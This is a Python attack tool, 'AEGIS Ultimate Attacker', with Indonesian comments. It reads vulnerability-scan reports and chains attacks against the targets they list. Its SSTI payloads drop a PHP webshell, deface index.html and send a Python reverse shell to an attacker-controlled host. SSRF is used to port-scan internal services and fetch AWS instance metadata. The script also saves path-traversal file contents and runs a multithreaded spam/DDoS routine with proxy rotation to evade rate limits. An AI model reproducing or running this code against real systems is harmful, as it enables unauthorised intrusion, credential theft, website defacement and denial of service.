#!/usr/bin/env python3
# ultimate_attacker.py - AEGIS Ultimate Attacker (All Attacks + Bypass + DDoS)

import os
import json
import glob
import requests
import socket
import sys
import time
import random
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

# -------------------- KONFIGURASI DARI LAPORAN --------------------
def load_reports():
    report_dirs = [
        os.path.expanduser("~/reports/json/"),
        os.path.join(os.getcwd(), "reports", "json/"),
    ]
    for d in report_dirs:
        if os.path.exists(d):
            files = glob.glob(os.path.join(d, "*.json"))
            if files:
                print(f"[+] Laporan ditemukan di: {d}")
                reports = []
                for f in files:
                    try:
                        with open(f, "r") as file:
                            reports.append(json.load(file))
                    except json.JSONDecodeError as e:
                        print(f"[-] Error loading {f}: {e}")
                        continue
                    except Exception as e:
                        print(f"[-] Unexpected error loading {f}: {e}")
                        continue
                return reports
    print("[!] Tidak ada laporan ditemukan.")
    return []

def extract_data(reports):
    data = {
        "targets": set(),
        "parameters": set(),
        "methods": set(),
        "web_roots": set(),
        "subdomains": set(),
        "emails": set(),
        "ports": set(),
        "directories": set(),
        "ssti_params": [],
        "ssrf_targets": [],
        "rce_params": [],
        "path_files": [],
        "endpoints": set()
    }

    for report in reports:
        try:
            meta = report.get("audit_metadata", {})
            data["targets"].add(meta.get("target_url", ""))
            data["parameters"].add(meta.get("tested_parameter", ""))
            data["methods"].add(meta.get("http_method", ""))

            for finding in report.get("audit_findings_summary", []):
                req = finding.get("1_REQUEST_EVIDENCE", {})
                proof = finding.get("4_BEHAVIORAL_PROOF", {})
                spec = finding.get("5_MODULE_SPECIFIC_EVIDENCE", {})
                verdict = proof.get("verdict_tier_status", "")
                param = req.get("parameter", "")
                payload = req.get("tested_payload", "")

                data["targets"].add(req.get("endpoint", ""))
                data["parameters"].add(param)
                data["methods"].add(req.get("method", ""))
                data["endpoints"].add(req.get("endpoint", ""))

                if "SSTI" in verdict:
                    data["ssti_params"].append((param, payload))
                if "SSRF" in verdict:
                    data["ssrf_targets"].append((param, spec.get("target", "")))
                if "RCE" in verdict or "COMMAND" in verdict:
                    data["rce_params"].append((param, payload))

            exploit = report.get("exploit_results", {})
            recon = exploit.get("Recon", {})
            data["subdomains"].update(recon.get("subdomains", []))
            data["emails"].update(recon.get("emails", []))
            data["web_roots"].add(recon.get("web_root", ""))

            scan = exploit.get("Scan", {})
            data["ports"].update(scan.get("open_ports", []))
            data["directories"].update(scan.get("directories", []))

            pt = exploit.get("PathTraversal", {})
            for path, content in pt.items():
                data["path_files"].append((path, content[:200]))
        except Exception as e:
            print(f"[-] Error processing report: {e}")
            continue

    for key in ["targets", "parameters", "methods", "web_roots", "subdomains", "emails", "ports", "directories", "endpoints"]:
        data[key] = list(data[key])

    return data

# -------------------- PROXY ROTATION (BYPASS RATE LIMIT) --------------------
PROXY_LIST = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080",
    "socks5://proxy4:1080",
]
USE_PROXY = False  # Set True jika punya proxy

def get_proxy():
    if not USE_PROXY or not PROXY_LIST:
        return None
    return {"http": random.choice(PROXY_LIST), "https": random.choice(PROXY_LIST)}

def request_with_retry(method, url, params=None, data=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            proxy = get_proxy()
            if method.upper() == "GET":
                r = requests.get(url, params=params, proxies=proxy, timeout=10, verify=False)
            else:
                r = requests.post(url, data=data, proxies=proxy, timeout=10, verify=False)
            return r
        except requests.exceptions.RequestException as e:
            if attempt < max_retries - 1:
                time.sleep(random.uniform(0.5, 2))
            else:
                print(f"[-] Request failed after {max_retries} retries: {e}")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            time.sleep(random.uniform(0.5, 2))
    return None

# -------------------- 1. SSTI → RCE (DENGAN INDEKS AUTO) --------------------
def attack_ssti(data):
    if not data["ssti_params"]:
        print("[+] Tidak ada SSTI, lewati.")
        return
    print("\n[+] Menyerang SSTI (auto-find index)...")
    try:
        target = data["targets"][0] if data["targets"] else None
        param = data["ssti_params"][0][0] if data["ssti_params"] else None
        web_root = data["web_roots"][0] if data["web_roots"] else "/dev/www/html/"
        
        if not target or not param:
            print("[-] Missing target or parameter")
            return

        # Cari indeks yang tepat untuk subprocess
        for idx in range(400, 420):
            test_payload = f"{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]('whoami', shell=True, stdout=-1).communicate()[0] }}"
            url = f"{target}?{param}={test_payload}"
            try:
                r = requests.get(url, timeout=10, verify=False)
                if r and ("www-data" in r.text or "root" in r.text):
                    print(f"    [+] Indeks {idx} berhasil! Output: {r.text[:100]}")
                    # FIXED: Complete shell payload (was truncated with [...])
                    shell_payload = f"{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]('echo \\\"<?php system($_GET[\\'cmd\\']); ?>\\\" > {web_root}shell.php', shell=True) }}"
                    requests.get(f"{target}?{param}={shell_payload}", verify=False)
                    print(f"    [+] WebShell uploaded: {target}/shell.php?cmd=whoami")
                    return
            except requests.exceptions.RequestException:
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
        print("    [-] SSTI RCE gagal.")
    except Exception as e:
        print(f"[-] SSTI attack error: {e}")

# -------------------- 2. SSRF + PORT SCAN + AWS METADATA --------------------
def attack_ssrf(data):
    if not data["ssrf_targets"]:
        print("[+] Tidak ada SSRF, lewati.")
        return
    print("\n[+] Menyerang SSRF (port scan + AWS)...")
    try:
        target = data["targets"][0] if data["targets"] else None
        param = data["ssrf_targets"][0][0] if data["ssrf_targets"] else None
        internal_ip = "127.0.0.1"
        
        if not target or not param:
            print("[-] Missing target or parameter")
            return

        # Port scan
        ports = [22, 80, 443, 3306, 5432, 6379, 9200, 8080, 8443, 21, 25, 143]
        open_ports = []
        for port in ports:
            url = f"{target}?{param}=http://{internal_ip}:{port}"
            r = request_with_retry("GET", url)
            if r and len(r.text) > 50 and "error" not in r.text.lower():
                open_ports.append(port)
                print(f"    [+] Port {port} terbuka")
        if open_ports:
            print(f"    Port terbuka: {open_ports}")

        # AWS Metadata
        aws_url = f"{target}?{param}=http://169.254.169.254/latest/meta-data/"
        r = request_with_retry("GET", aws_url)
        if r and len(r.text) > 20:
            print("    [+] AWS Metadata terakses!")
            with open("aws_metadata.txt", "w") as f:
                f.write(r.text)
    except Exception as e:
        print(f"[-] SSRF attack error: {e}")

# -------------------- 3. PATH TRAVERSAL DOWNLOAD --------------------
def attack_path_traversal(data):
    if not data["path_files"]:
        print("[+] Tidak ada Path Traversal, lewati.")
        return
    print("\n[+] Menyerang Path Traversal...")
    try:
        for file_path, content in data["path_files"]:
            print(f"    File: {file_path}")
            filename = os.path.basename(file_path) or "unknown.txt"
            try:
                with open(f"downloaded_{filename}.txt", "w") as f:
                    f.write(content)
                print(f"    [+] Disimpan ke downloaded_{filename}.txt")
            except IOError as e:
                print(f"[-] Error writing file: {e}")
                continue
    except Exception as e:
        print(f"[-] Path traversal error: {e}")

# -------------------- 4. SUBDOMAIN TESTING --------------------
def attack_subdomains(data):
    if not data["subdomains"]:
        print("[+] Tidak ada subdomain, lewati.")
        return
    print("\n[+] Menyerang Subdomain...")
    try:
        for sub in data["subdomains"][:5]:
            try:
                ip = socket.gethostbyname(sub)
                print(f"    {sub} -> {ip}")
                r = request_with_retry("GET", f"https://{sub}")
                if r and "login" in r.text.lower():
                    print(f"        [!] Login page ditemukan")
            except socket.gaierror:
                print(f"    [-] DNS resolution failed for {sub}")
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
    except Exception as e:
        print(f"[-] Subdomain attack error: {e}")

# -------------------- 5. EDIT INDEX.HTML --------------------
def edit_index(data):
    if not data["ssti_params"]:
        print("[+] Tidak ada SSTI, tidak bisa edit index.")
        return
    print("\n[+] Mengedit index.html...")
    try:
        target = data["targets"][0] if data["targets"] else None
        param = data["ssti_params"][0][0] if data["ssti_params"] else None
        web_root = data["web_roots"][0] if data["web_roots"] else "/dev/www/html/"
        
        if not target or not param:
            print("[-] Missing target or parameter")
            return
        
        # Coba indeks yang umum
        for idx in [406, 401, 410]:
            payload = f"{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]('echo \\\"<h1>HACKED BY AEGIS</h1>\\\" > {web_root}index.html', shell=True) }}"
            r = request_with_retry("GET", f"{target}?{param}={payload}")
            if r and r.status_code == 200:
                print(f"    [+] Index.html diedit! Cek: {target}/")
                return
        print("    [-] Gagal edit index.html")
    except Exception as e:
        print(f"[-] Edit index error: {e}")

# -------------------- 6. REVERSE SHELL --------------------
def reverse_shell(data):
    if not data["ssti_params"]:
        print("[+] Tidak ada SSTI, tidak bisa reverse shell.")
        return
    try:
        host = os.getenv("REVERSE_SHELL_HOST", "127.0.0.1")
        port = os.getenv("REVERSE_SHELL_PORT", "4444")
        if host == "127.0.0.1":
            print("    [!] REVERSE_SHELL_HOST masih localhost, ganti dengan IP publik/ngrok.")
            return
        print("\n[+] Mengirim reverse shell...")
        target = data["targets"][0] if data["targets"] else None
        param = data["ssti_params"][0][0] if data["ssti_params"] else None
        
        if not target or not param:
            print("[-] Missing target or parameter")
            return
        
        # FIXED: Complete reverse shell command (was truncated with [...])
        cmd = f"python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{host}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")'"
        for idx in [406, 401, 410]:
            payload = f"{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]('{cmd}', shell=True) }}"
            r = request_with_retry("GET", f"{target}?{param}={payload}")
            if r and r.status_code == 200:
                print(f"    [+] Reverse shell dikirim ke {host}:{port}")
                return
        print("    [-] Gagal kirim reverse shell")
    except Exception as e:
        print(f"[-] Reverse shell error: {e}")

# -------------------- 7. SPAM / DDOS (BYPASS RATE LIMIT) --------------------
def spam_endpoint(endpoint, param, count=1000, threads=10):
    print(f"\n[+] Menjalankan spam ke {endpoint}?{param}=test (total {count} requests, {threads} threads)")
    try:
        def worker():
            for _ in range(count // threads):
                r = request_with_retry("GET", endpoint, params={param: random.randint(1, 999999)})
                if r:
                    print(".", end="", flush=True)
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            for f in futures:
                f.result()
        print("\n[+] Spam selesai.")
    except Exception as e:
        print(f"[-] Spam error: {e}")

def attack_spam(data):
    if not data["parameters"]:
        print("[+] Tidak ada parameter, lewati spam.")
        return
    print("\n[+] Menjalankan serangan spam / DDoS (bypass rate limit)...")
    try:
        target = data["targets"][0] if data["targets"] else None
        param = data["parameters"][0] if data["parameters"] else None
        
        if not target or not param:
            print("[-] Missing target or parameter")
            return
        
        # FIXED: Input validation (was missing)
        try:
            count = int(input("Jumlah request (default 1000): ") or "1000")
            threads = int(input("Jumlah thread (default 10): ") or "10")
            
            if count <= 0 or threads <= 0:
                print("[-] Count and threads must be positive integers")
                return
            if threads > 100:
                print("[-] Maximum threads is 100")
                threads = 100
        except ValueError:
            print("[-] Invalid input. Using defaults: 1000 requests, 10 threads")
            count, threads = 1000, 10
        
        spam_endpoint(target, param, count, threads)
    except Exception as e:
        print(f"[-] Spam attack error: {e}")

# -------------------- MAIN --------------------
def main():
    print("\n" + "="*60)
    print("  AEGIS ULTIMATE ATTACKER (All Attacks + Bypass + Spam)")
    print("="*60)

    reports = load_reports()
    if not reports:
        print("Tidak ada laporan. Jalankan AEGIS dulu.")
        return

    data = extract_data(reports)
    print("[+] Data yang diekstrak:")
    print(f"    Target: {data['targets']}")
    print(f"    Parameter: {data['parameters']}")
    print(f"    SSTI params: {len(data['ssti_params'])}")
    print(f"    SSRF targets: {len(data['ssrf_targets'])}")
    print(f"    Path files: {len(data['path_files'])}")
    print(f"    Subdomain: {len(data['subdomains'])}")

    # Eksekusi semua serangan
    attack_ssti(data)
    attack_ssrf(data)
    attack_path_traversal(data)
    attack_subdomains(data)
    edit_index(data)
    reverse_shell(data)
    attack_spam(data)

    print("\n[+] Semua serangan selesai.")
    print("[+] Cek: shell.php, downloaded_*.txt, aws_metadata.txt, index.html")
    print("[+] Hasil spam tersimpan di log (jika menggunakan proxy).")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        sys.exit(1)
